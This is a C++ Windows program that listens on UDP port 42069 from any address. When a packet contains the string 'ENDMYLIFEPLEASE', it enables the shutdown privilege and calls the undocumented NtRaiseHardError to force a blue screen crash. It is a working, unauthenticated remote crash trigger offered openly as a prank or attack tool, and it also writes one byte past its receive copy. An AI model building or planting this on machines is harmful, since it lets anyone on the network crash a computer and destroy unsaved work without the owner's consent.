#include <winsock2.h>
#include <windows.h>
#include <iostream>

void fbmc()
{

	//code from here
	//https://github.com/jpiechowka/quick-bsod/blob/master/src/QuickBSOD.cpp
	//thank you bro

	typedef NTSTATUS(NTAPI* TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
	typedef NTSTATUS(NTAPI* TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR* Parameters, ULONG ValidResponseOption, PULONG Response);

	HMODULE hNtdll = GetModuleHandle("ntdll.dll");

	if (hNtdll != 0)
	{
		NTSTATUS s1, s2;
		BOOLEAN b;
		ULONG r;

		//Enable shutdown privilege
		//More https://msdn.microsoft.com/en-us/library/bb530716%28VS.85%29.aspx

		TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
		s1 = pfnRtlAdjustPrivilege(19, true, false, &b);

		//Cause BSOD
		//More about NtRaiseHardError here http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError.html

		TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
		s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
	}
}

int main(int argc, char* argv[])
{
	
	//code referenced from here
	//https://www.winsocketdotnetworkprogramming.com/winsock2programming/winsock2advancedcode1e.html
	//honestly how the hell does anyone use windows apis and not go insane

	WSADATA wsaData;
	SOCKET ReceivingSocket;
	SOCKADDR_IN ReceiverAddr;
	int port = 42069; //haha funny number
	char* inBuff = new char[1024];
	SOCKADDR_IN SenderAddr;
	int SenderAddrSize = sizeof(SenderAddr);
	int Received = 5;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		fprintf(stderr, "WSAS Could not start: %ld\n", WSAGetLastError());
		return -666;
	}

	ReceivingSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (ReceivingSocket == INVALID_SOCKET)
	{
		fprintf(stderr, "Server could not start because of something stupid.. %ld\n", WSAGetLastError());
		WSACleanup();
		return -666;
	}

	ReceiverAddr.sin_family = AF_INET;
	ReceiverAddr.sin_port = htons(port);
	ReceiverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

	if (bind(ReceivingSocket, (SOCKADDR*)&ReceiverAddr, sizeof(ReceiverAddr)) == SOCKET_ERROR)
	{
		fprintf(stderr, "could not bind socket: %ld\n", WSAGetLastError());
		closesocket(ReceivingSocket);
		WSACleanup();
		return -666;
	}

	fprintf(stdout, "listening for bluescreens\r\n");

	while (true)
	{
		Received = recvfrom(ReceivingSocket, inBuff, 1024, 0, (SOCKADDR*)&SenderAddr, &SenderAddrSize);
		if (Received > 0)
		{
			fprintf(stdout, "shhhhhh.. i hear something... sounds about %i bytes long\n",Received);
			char* data = new char[Received];
			memcpy(data, inBuff, Received);
			data[Received] = '\0';
			if (std::string("ENDMYLIFEPLEASE")==std::string(data))
			{
				fprintf(stdout, "....sounds like a......BLUESCREEN\n");
				fbmc();
			}
		}
	}

}